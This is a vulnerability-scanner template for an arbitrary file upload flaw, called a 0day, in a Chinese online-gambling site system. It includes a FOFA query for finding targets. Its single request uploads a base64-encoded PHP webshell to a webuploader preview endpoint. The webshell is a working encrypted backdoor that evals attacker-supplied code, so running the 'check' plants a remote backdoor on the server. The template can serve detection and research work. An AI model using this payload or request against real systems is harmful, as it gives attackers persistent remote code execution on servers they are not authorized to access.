expression: r0()
id: bocai-anyfile-upload
info:
  author: daffainfo
  description: "\u7F51\u7EDC\u8D4C\u535A\u662F\u6307\u901A\u8FC7\u4E92\u8054\u7F51\
    \u624B\u6BB5\uFF08\u975E\u6CD5\u8D4C\u535A\u7F51\u7AD9\u3001\u535A\u5F69App\u3001\
    \u5FAE\u4FE1\u7FA4\u7B49\uFF09\u8FDB\u884C\u7684\u8D4C\u535A\u6D3B\u52A8\u3002\
    \u7531\u4E8E\u7F51\u7EDC\u8D4C\u535A\u4E0D\u5408\u6CD5\uFF0C\u8D44\u91D1\u4E0D\
    \u53D7\u6CD5\u5F8B\u4FDD\u62A4\uFF0C\u6709\u5F88\u591A\u201C\u51FA\u8001\u5343\
    \u201D\u7684\u884C\u4E3A\uFF0C\u5F88\u591A\u4EBA\u88AB\u9A97\u540E\u5F80\u5F80\
    \u4E0D\u6562\u62A5\u8B66\uFF0C\u5BFC\u81F4\u5BB6\u7834\u4EBA\u4EA1\uFF0C\u6240\
    \u4EE5\u6253\u51FB\u8D4C\u535A\uFF0C\u523B\u4E0D\u5BB9\u7F13\u3002\u67D0\u83E0\
    \u83DC\u7CFB\u7EDF\u7CFB\u7EDF\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\
    \u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\u53EF\u4EE5\u4E0A\
    \u4F20\u6728\u9A6C\u6587\u4EF6\uFF0C\u5BFC\u81F4\u670D\u52A1\u5668\u5931\u9677\
    \u3002\nfofa-query: body=\"main.e5ee9b2df05fc2d310734b11cc8c911e.css\"\n"
  name: "\u67D0\u83E0\u83DC \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\uFF08\
    0day\uFF09"
  reference:
  - https://mp.weixin.qq.com/s/q7rSG_sAMmbd5o6m532arg
  severity: critical
  verified: false
rules:
  r0:
    expression: response.status == 200 && "webuploader/0.1.5/server/(.*).php".bmatches(response.body)
      && response.body.bcontains(b'"id"')
    request:
      body: 'data:image/php;base64,PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IAoJJF9TRVNTSU9OWydrJ109JGtleTsKCSRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOwoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkKCXsKCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7CgkJJHBvc3Q9JHQoJHBvc3QuIiIpOwoJCQoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgewogICAgCQkJICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOyAKICAgIAkJCX0KCX0KCWVsc2UKCXsKCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsKCX0KICAgICRhcnI9ZXhwbG9kZSgnfCcsJHBvc3QpOwogICAgJGZ1bmM9JGFyclswXTsKICAgICRwYXJhbXM9JGFyclsxXTsKCWNsYXNzIEN7cHVibGljIGZ1bmN0aW9uIF9faW52b2tlKCRwKSB7ZXZhbCgkcC4iIik7fX0KICAgIEBjYWxsX3VzZXJfZnVuYyhuZXcgQygpLCRwYXJhbXMpOwo/Pg==

        '
      headers:
        Dnt: 1
        If-Modified-Since: Mon, 05 Sep 2022 01:19:50 GMT
        If-None-Match: 63154eb6-273
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: none
        Sec-Fetch-User: ?1
        Te: trailers
      method: POST
      path: //statics/admin/webuploader/0.1.5/server/preview.php
